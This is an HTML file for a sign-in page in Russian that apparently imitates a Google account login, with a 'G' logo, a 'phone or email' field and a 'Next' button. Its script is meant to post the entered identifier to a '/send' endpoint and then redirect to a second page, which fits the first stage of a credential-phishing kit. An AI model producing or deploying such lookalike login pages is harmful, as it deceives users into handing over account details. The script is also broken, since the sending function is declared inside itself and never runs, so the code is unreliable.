<!DOCTYPE html>
<html>
<head>
    <title>Chat</title>

    <style>
        body {
            margin: 0;
            height: 100vh;
            background: #202124;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .main {
            width: 900px;
            height: 500px;
            background: #202124;
            display: flex;
            border-radius: 12px;
            padding: 40px;
            box-sizing: border-box;
        }

        .left {
            flex: 1;
        }

        .logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .title {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #9aa0a6;
        }

        .right {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .input-group {
            position: relative;
            margin-bottom: 10px;
        }

        input {
            width: 100%;
            padding: 16px;
            background: transparent;
            border: 1px solid #5f6368;
            border-radius: 6px;
            color: white;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border: 2px solid #8ab4f8;
        }

        label {
            position: absolute;
            left: 14px;
            top: 16px;
            color: #9aa0a6;
            background: #202124;
            padding: 0 4px;
            transition: 0.2s;
        }

        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: -8px;
            font-size: 12px;
            color: #8ab4f8;
        }

        .link {
            color: #8ab4f8;
            font-size: 14px;
            margin: 10px 0;
            cursor: pointer;
        }

        .bottom {
            margin-top: 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .btn {
            background: #8ab4f8;
            border: none;
            color: black;
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-weight: 500;
        }

        .btn:hover {
            background: #a1c2fa;
        }

    </style>

</head>
<body>

<div class="main">

    <div class="left">
        <div class="logo">G</div>
        <div class="title">Вход в Chat</div>
        <div class="subtitle">Используйте свой аккаунт</div>
    </div>

    <div class="right">

        <div class="input-group">
            <input id="msg" placeholder=" " required>
            <label>Телефон или эл. почта</label>
        </div>

        <div class="link">Забыли адрес электронной почты?</div>

        <div class="bottom">
            <div class="link">Создать аккаунт</div>
            <button class="btn" onclick="send()">Далее</button>
        </div>

    </div>

</div>

<script>
function send() {
    function send() {
    fetch("/send", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            message: document.getElementById("msg").value
        })
    });

    // 🔥 yangi sahifaga o‘tadi
    window.location.href = "/page2.html";
}
}
</script>

</body>
</html>
